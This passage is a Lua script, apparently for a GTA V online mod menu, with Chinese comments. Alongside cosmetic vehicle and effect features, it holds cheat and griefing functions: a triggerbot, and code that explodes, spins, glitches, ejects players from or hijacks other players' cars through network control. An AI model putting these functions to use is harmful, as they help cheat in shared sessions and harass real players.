effectColour = {r = 0.5, g = 0.0, b = 0.5, a = 1.0}

function hittingeffect()
    local effect = hitEffects[selectedOpt]
	if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
		return STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
	end

	local hitCoords = v3.new()
	if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), memory.addrof(hitCoords)) then
		local raycastResult = get_raycast_result(1000.0)
		local rot = raycastResult.surfaceNormal:toRot()
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)

		if effect.colorCanChange then
			local colour = effectColour
			GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
		end
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
			effect.name, hitCoords.x,hitCoords.y,hitCoords.z, rot.x - 90.0, rot.y, rot.z, 1.0, false, false, false, false)
	end
end

function sethiteffect(opt)
    selectedOpt = opt
end

function friendshipgun(toggle)
    PED.SET_CAN_ATTACK_FRIENDLY(players.user_ped(), toggle, false)
end

function get_entity_player_is_aiming_at(player)
	if not PLAYER.IS_PLAYER_FREE_AIMING(player) then
		return NULL
	end
	local entity, pEntity = NULL, memory.alloc_int()
	if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(player, pEntity) then
		entity = memory.read_int(pEntity)
	end
	if entity ~= NULL and ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_IN_ANY_VEHICLE(entity, false) then
		entity = PED.GET_VEHICLE_PED_IS_IN(entity, false)
	end
	return entity
end

function magnetents()
    local entity = get_entity_player_is_aiming_at(players.user())
	if entity ~= 0 and ENTITY.DOES_ENTITY_EXIST(entity) then
		draw_bounding_box(entity, true, {r = 255, g = 255, b = 255, a = 81})

		if PED.IS_PED_SHOOTING(players.user_ped()) and
		not (shotEntities[1] and shotEntities[1] == entity) then
			counter = counter + 1
			shotEntities[counter] = entity
		end

		if counter == 2 then
			local entPair = EntityPair.new(table.unpack(shotEntities))
			table.insert_once(entityPairs, entPair)
			counter = 0
			shotEntities = {}
		end
	end

	for i = #entityPairs, 1, -1 do
		local entPair = entityPairs[i]
		if entPair:exists() then entPair:attract() else table.remove(entityPairs, i) end
	end
end

function ROTATION_TO_DIRECTION(rotation) --https://forum.cfx.re/t/get-position-where-player-is-aiming/1903886/2
	local adjusted_rotation = 
	{ 
		x = (math.pi / 180) * rotation.x, 
		y = (math.pi / 180) * rotation.y, 
		z = (math.pi / 180) * rotation.z 
	}
	local direction = 
	{
		x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		z =  math.sin(adjusted_rotation.x)
	}
	return direction
end

function incr(ptr, fvalue, delta)
    local cvalue = memory.read_float(ptr) 
    local delta = math.abs(delta)
	
	if cvalue ~= fvalue then
    	if cvalue > fvalue then 
			delta = -delta 
		end
		
    	if math.abs(fvalue - cvalue) > delta then
    	    cvalue = cvalue + delta
    	else  
    	    cvalue = fvalue
    	end
	end
    
    memory.write_float(ptr, cvalue)
end
--女武神火箭
function rocketgo(toggle)
    local alloc = memory.alloc
    local getTime = util.current_time_millis
	valkyire_rocket = toggle

	if valkyire_rocket then
		local rocket, cam
		local g = alloc()
		local bar = alloc(); 
		local init
		local sTime
		local draw_rect = function(x, y, z, w)
			GRAPHICS.DRAW_RECT(x, y, z, w, 255, 255, 255, 255)
		end
	
		while valkyire_rocket do
			wait()

			if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
				if not init then init = true end
				sTime = getTime()
			end

			if init then
				if not ENTITY.DOES_ENTITY_EXIST(rocket) then
					local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID())
					local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(weapon, 0.0, 1.0, 0.0)
					rocket =  entities.create_object(util.joaat('w_lr_rpg_rocket'), c)
					CAM.DESTROY_ALL_CAMS(true)
					cam = CAM.CREATE_CAM('DEFAULT_SCRIPTED_CAMERA', true)
					CAM.ATTACH_CAM_TO_ENTITY(cam, rocket, 0.0, 0.0, 0.0, true)
					CAM.RENDER_SCRIPT_CAMS(true, true, 700, true, true)
					CAM.SET_CAM_ACTIVE(cam, true)
					ENTITY.SET_ENTITY_VISIBLE(rocket, 0)
					memory.write_float(bar, 0.5); memory.write_float(g, 255)
				else
					local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
					CAM.SET_CAM_ROT(cam, rot.x, rot.y, rot.z, 0)
					ENTITY.SET_ENTITY_ROTATION(rocket, rot.x, rot.y, rot.z, 0, 1)

					local c = vect.add(ENTITY.GET_ENTITY_COORDS(rocket), vect.mult(ROTATION_TO_DIRECTION(CAM.GET_GAMEPLAY_CAM_ROT(0)), 0.8))
					ENTITY.SET_ENTITY_COORDS(rocket, c.x, c.y, c.z, false, false, false, false)
					STREAMING.SET_FOCUS_POS_AND_VEL(c.x, c.y, c.z, 5.0, 0.0, 0.0)

					HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
					PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
					ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
					HUD._HUD_WEAPON_WHEEL_IGNORE_SELECTION()
					
					draw_rect(0.5, 0.5 - 0.025, 0.050, 0.002)
					draw_rect(0.5, 0.5 + 0.025, 0.050, 0.002)
					draw_rect(0.5 - 0.025, 0.5, 0.002, 0.052)
					draw_rect(0.5 + 0.025, 0.5, 0.002, 0.052)
					draw_rect(0.5 + 0.05, 0.5, 0.050, 0.002)
					draw_rect(0.5 - 0.05, 0.5, 0.050, 0.002)
					draw_rect(0.5, 0.5 + 0.05, 0.002, 0.050)
					draw_rect(0.5, 0.5 - 0.05, 0.002, 0.050)
					GRAPHICS.SET_TIMECYCLE_MODIFIER('CAMERA_secuirity')

					GRAPHICS.DRAW_RECT(0.25, 0.5, 0.03, 0.5, 255, 255, 255, 255)

					if getTime() - sTime >= 100 then
						incr(bar, 0, -0.01); incr(g, 0, -4)
						sTime = getTime()
					end

					GRAPHICS.DRAW_RECT(0.25, 0.75 - (memory.read_float(bar) / 2), 0.03, memory.read_float(bar), 255, round(memory.read_float(g)), 0, 255)

					local groundZ = alloc()
					MISC.GET_GROUND_Z_FOR_3D_COORD(ENTITY.GET_ENTITY_COORDS(rocket).x, ENTITY.GET_ENTITY_COORDS(rocket).y, ENTITY.GET_ENTITY_COORDS(rocket).z, groundZ, 0)
					groundZ = memory.read_float(groundZ)
					
					if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(rocket) or math.abs(ENTITY.GET_ENTITY_COORDS(rocket).z - groundZ) < 0.5 or memory.read_float(bar) <= 0.01 then
						local impact_coord = ENTITY.GET_ENTITY_COORDS(rocket); ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
						FIRE.ADD_EXPLOSION(impact_coord.x, impact_coord.y, impact_coord.z, 32, 1.0, true, false, 0.4)
						entities.delete(rocket)
						rocket = 0
						PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
						STREAMING.CLEAR_FOCUS()
						CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
						CAM.DESTROY_CAM(cam, 1)
						GRAPHICS.SET_TIMECYCLE_MODIFIER('DEFAULT')
						init = false
					end
				end
			end
		end
		GRAPHICS.SET_TIMECYCLE_MODIFIER('DEFAULT')
		STREAMING.CLEAR_FOCUS()
		CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
		CAM.DESTROY_CAM(cam, 1)
		PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
		rocket = 0
		bar = 0.5
		y = 255
		ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
	end
end

--扳机机器人
triggerbot_delay = 100
local ent_alloc = memory.alloc_int()
function trigger(on)
    PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), ent_alloc)
    if memory.read_int(ent_alloc) ~= 0 then 
        local ent = memory.read_int(ent_alloc)
        if ENTITY.GET_ENTITY_TYPE(ent) == 1 and PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), ent) then
            if PED.GET_PED_CONFIG_FLAG(players.user_ped(), 78, true) then  
                PAD._SET_CONTROL_NORMAL(2, 24, 1.0)
                wait(triggerbot_delay)
                PAD._SET_CONTROL_NORMAL(2, 24, 0.0)
            end
        end
    end
end

function aa_thread()
    aa_threadv = util.create_thread(function()
        while true do
            if not noaccident then
                util.stop_thread()
            end
            if player_cur_car ~= 0 then
                local c = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
                local size = get_model_size(ENTITY.GET_ENTITY_MODEL(player_cur_car))
                for i=1,3 do
                    if i == 1 then
                        aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, -size['x'], size['y']+0.1, size['z']/2)
                    elseif i == 2 then
                        aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, 0.0, size['y']+0.1, size['z']/2)
                    else
                        aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, size['x'], size['y']+0.1, size['z']/2)
                    end
                    if ENTITY.GET_ENTITY_SPEED(player_cur_car) > 10 then
                        log("aa thread allocation")
                        local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
                        SHAPETEST.GET_SHAPE_TEST_RESULT(
                            SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
                                c.x,
                                c.y,
                                c.z,
                                aad.x,
                                aad.y,
                                aad.z,
                                -1,
                                player_cur_car,
                                4
                            ), ptr1, ptr2, ptr3, ptr4)
                        local p1 = memory.read_int(ptr1)
                        local p2 = memory.read_vector3(ptr2)
                        local p3 = memory.read_vector3(ptr3)
                        local p4 = memory.read_int(ptr4)
                        log("aa thread free mem")
                        memory.free(ptr1)
                        memory.free(ptr2)
                        memory.free(ptr3)
                        memory.free(ptr4)
                        local results = {p1, p2, p3, p4}
                        if results[1] ~= 0 then
                            ENTITY.SET_ENTITY_VELOCITY(player_cur_car, 0.0, 0.0, 0.0)
                            util.toast("车辆事故即将发生！ 停止车辆。")
                        end
                    end
                end
            end
        wait()
        end
    end)
end

------------------------------------
-----------粒子效果轰炸-------------
------------------------------------
function Streamptfx(lib)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(lib)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(lib) do
        wait()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET(lib)
end

local ptfx = {lib = 'scr_rcbarry2', sel = 'scr_clown_appears'}
function ftpxspam(pid)
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    Streamptfx(ptfx.lib)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( ptfx.sel, tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 10.0, true, true, true)
end

function ftpxspam_set(fxsel)
    ptfx.sel = Fxha[fxsel]
    ptfx.lib = 'core'
end

------------------------------------
-------------载具恶搞---------------
------------------------------------
local function request_control_of_entity_once(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
    end
end

function caremp(pid)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        local c = ENTITY.GET_ENTITY_COORDS(car)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, 83, 100.0, false, true, 0.0)
    end
end

function carspin(pid)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity_once(car)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(car, 4, 0.0, 0.0, 300.0, 0, true, true, false, true, true, true)
    end
end

local glitchVeh = false
function glitchcar(toggle, pid)
    glitchVeh = toggle
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(pid)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        request_model(ped_hash)
        request_model(object_hash)
        
        while glitchVeh do
            if not players.exists(pid) then 
                util.toast("玩家不存在. :/")
                menu.set_value(glitchVehCmd, false);
            util.stop_thread() end

            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("玩家太远了. :/")
                menu.set_value(glitchVehCmd, false);
            break end

            if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then 
                util.toast("他不在车里! ")
                menu.set_value(glitchVehCmd, false);
            break end

            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("车上没空座位了\n建议你给他车砸了.")
                menu.set_value(glitchVehCmd, false);
            break end

            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)

            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)

            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end

            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        wait()
                    end
                end
            end
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then
                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end

function kickcar(pid)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
        player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        DECORATOR.DECOR_REGISTER("Player_Vehicle", 3)
        DECORATOR.DECOR_SET_INT(player_veh,"Player_Vehicle", 0)
    else
        util.toast("玩家不在车内. :/")
    end
end

function get_player_vehicle_in_control(pid, opts)
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()) -- Needed to turn off spectating while getting control
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

    -- Calculate how far away from target
    local pos1 = ENTITY.GET_ENTITY_COORDS(target_ped)
    local pos2 = ENTITY.GET_ENTITY_COORDS(my_ped)
    local dist = SYSTEM.VDIST2(pos1.x, pos1.y, 0, pos2.x, pos2.y, 0)

    local was_spectating = NETWORK.NETWORK_IS_IN_SPECTATOR_MODE() -- Needed to toggle it back on if currently spectating
    -- If they out of range (value may need tweaking), auto spectate.
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
    if opts and opts.near_only and vehicle == 0 then
        return 0
    end
    if vehicle == 0 and target_ped ~= my_ped and dist > 340000 and not was_spectating then
        menu.toast("AUTO_SPECTATE")
        show_busyspinner(menu.format("AUTO_SPECTATE"))
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, target_ped)
        -- To prevent a hard 3s loop, we keep waiting upto 3s or until vehicle is acquired
        local loop = (opts and opts.loops ~= nil) and opts.loops or 30 -- 3000 / 100
        while vehicle == 0 and loop > 0 do
            wait(100)
            vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
            loop = loop - 1
        end
        HUD.BUSYSPINNER_OFF()
    end

    if vehicle > 0 then
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
            return vehicle
        end
        -- Loop until we get control
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(vehicle)
        local has_control_ent = false
        local loops = 15
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)

        -- Attempts 15 times, with 8ms per attempt
        while not has_control_ent do
            has_control_ent = NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            loops = loops - 1
            -- wait for control
            wait(15)
            if loops <= 0 then
                break
            end
        end
    end
    if not was_spectating then
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(false, target_ped)
    end
    return vehicle
end

local function control_vehicle(pid, callback, opts)
    local vehicle = get_player_vehicle_in_control(pid, opts)
    if vehicle > 0 then
        callback(vehicle)
    elseif opts == nil or opts.silent ~= true then
        util.toast("玩家不在车内或不在范围内。")
    end
end

function fastoncar()
    local localped = PLAYER.PLAYER_PED_ID()
    if PED.IS_PED_GETTING_INTO_A_VEHICLE(localped) then
        local veh = PED.GET_VEHICLE_PED_IS_ENTERING(localped)
        if not VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(veh) then
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(veh, 1000)
            VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, false)
        end
        if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 then
            --15 is heli
            VEHICLE.SET_HELI_BLADES_FULL_SPEED(veh)
        end
    end
end

function unlockcar()
    -- 解锁正在进入的载具
function UnlockVehicleGetIn()
    :: start ::
    local localPed = PLAYER.PLAYER_PED_ID()
    local veh = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(localPed)
    if PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
        local v = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED(v, 1)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(v, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(v, players.user(), false)
        ENTITY.FREEZE_ENTITY_POSITION(vehicle, false)
        wait()
    else
        if veh ~= 0 then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                for i = 1, 20 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    wait(100)
                end
            end
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                util.toast("请等待两秒，无法控制载具!")
                goto start
            else
                util.toast("已控制载具.")
            end
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 1)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(veh, false)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(veh, players.user(), false)
            VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, false)
        end
    end
end
UnlockVehicleGetIn()
end

function FastTurnVehicleWithKeys(scale)
    local veh = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
    local vv = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    local velocity = ENTITY.GET_ENTITY_SPEED_VECTOR(veh, true).y
    --Pitch: X || Roll: y || Yaw: z
    local vvPitch = v3.getX(vv)
    local vvRoll = v3.getY(vv)
    local vvYaw = v3.getZ(vv)
    if PAD.IS_CONTROL_PRESSED(0, 63) then --63 || INPUT_VEH_MOVE_LEFT_ONLY || A

        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end

        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.

            local yawAfterPress = vvYaw - scale
            if yawAfterPress < -180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
                local toSetYaw = overFlowNeg - scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end

    end

    if PAD.IS_CONTROL_PRESSED(0, 64) then --64 ||INPUT_VEH_MOVE_RIGHT_ONLY || D

        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
        local yawAfterPress = vvYaw - scale
        if yawAfterPress < -180 then -- check for overflow
            local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
            local toSetYaw = overFlowNeg - scale
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
        else --if not overflow
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
        end

        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.

            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end

    end
    v3.free(vv)
end

local rgb = {cus = 100}

function RGBNeonKit(pedm)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    for i = 0, 3 do
        WIRI_VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, true)
    end
end

function rainbow_car()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) ~= 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        RGBNeonKit(players.user_ped())
        local red = (math.random(0, 255))
        local green = (math.random(0, 255))
        local blue = (math.random(0, 255))
        WIRI_VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
        WIRI_VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vmod, red, green, blue)
        WIRI_VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vmod, red, green, blue)
        wait(rgb.cus)
       end
    end

function set_speed_rainbowcar(c)
    rgb.cus = c
end

local srgb = {cus = 100}

function rainbow_car_light()
    local color = {
        {64, 1}, --blue
        {73, 2}, --eblue  
        {51, 3}, --mgreen
        {92, 4}, --lgreen
        {89, 5}, --yellow
        {88, 6}, --gshower
        {38, 7}, --orange
        {39 , 8}, --red
        {137, 9}, --ponypink
        {135, 10}, --hotpink
        {145, 11}, --purple
        {142, 12} --blacklight
      }
     if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ~= 0 then
      local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
      RGBNeonKit(players.user_ped())
      local rcolor = math.random(1, 12)
      WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
      WIRI_VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color[rcolor][1])
      WIRI_VEHICLE.SET_VEHICLE_COLOURS(vmod, color[rcolor][1], color[rcolor][1])
      WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, 0, color[rcolor][1])
      WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vmod, color[rcolor][1])
      WIRI_VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color[rcolor][2])
      wait(srgb.cus)
    end
end

function set_speed_light(c)
    srgb.cus = c
end

function hittheplayerincar()
    local localPed = players.user_ped()
    if not PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
        return
    end
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
    for seat = -1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) - 1 do
        local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seat, false)
        if ENTITY.DOES_ENTITY_EXIST(ped) and ped ~= localPed and PED.IS_PED_A_PLAYER(ped) then
            local playerGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(ped)
            local myGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(localPed)
            PED.SET_RELATIONSHIP_BETWEEN_GROUPS(4, playerGroupHash, myGroupHash)
        end
    end
end

function ramdomupdatecar()
    local mod_types = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 12, 14, 15, 16, 23, 24, 25, 27, 28, 30, 33, 35, 38, 48}
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        for i, upgrades in ipairs(mod_types) do
            VEHICLE.SET_VEHICLE_MOD(entities.get_user_vehicle_as_handle(), upgrades, math.random(0, 20), false)
        end
    end
    wait(100)
end

function changecarsit(seatnumber)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
	local vehicle = entities.get_user_vehicle_as_handle()
	PED.SET_PED_INTO_VEHICLE(ped, vehicle, seatnumber)
end

function set_vehicle_handling_value(veh, offset, value)
    local v_ptr = entities.handle_to_pointer(veh)
    local handling = memory.read_long(v_ptr + 0x918)
    memory.write_float(handling + offset, value)
end

jclll = {"不上锁","上锁"}
function gethimcar(pid)
    control_vehicle(pid, function(vehicle)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, -2.0, 0.0, 0.1)
        ENTITY.SET_ENTITY_VELOCITY(vehicle, 0, 0, 0)
        local ped = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)
        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true)
        TASK.TASK_ENTER_VEHICLE(ped, vehicle, 1, 1, 1.0, 24)
        if hijackLevel == 1 then
            wait(20)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
        end
        for _ = 1, 20 do
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped, vehicle, 100.0, 2883621)
            wait(50)
        end
    end)
end

function randomupdatcar(pid)
    control_vehicle(pid, function(vehicle)
        VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
        for x = 0, 49 do
            local max = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, x)
            VEHICLE.SET_VEHICLE_MOD(vehicle, x, math.random(-1, max))
        end
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(-1,5))
        for x = 17, 22 do
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, x, math.random() > 0.5)
        end
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
    end)
end

DecorFlag_isAttacker = 1 << 2
local attacker = {
    stationary 	= false,
    godmode = false
}


local make_attacker = function (ped, targetId, weaponHash)
    set_decor_flag(ped, DecorFlag_isAttacker)
    PED.SET_PED_MAX_HEALTH(ped, 500)
    ENTITY.SET_ENTITY_HEALTH(ped, 500, 0)
    WEAPON.GIVE_WEAPON_TO_PED(ped, weaponHash, -1, true, true)
    WEAPON.SET_CURRENT_PED_WEAPON(ped, weaponHash, false)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, attacker.godmode)
    PED.SET_PED_COMBAT_MOVEMENT(ped, attacker.stationary and 0 or 2)
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 0, false)
    PED.SET_RAGDOLL_BLOCKING_FLAGS(ped, 1)
    PED.SET_PED_TARGET_LOSS_RESPONSE(ped, 2)
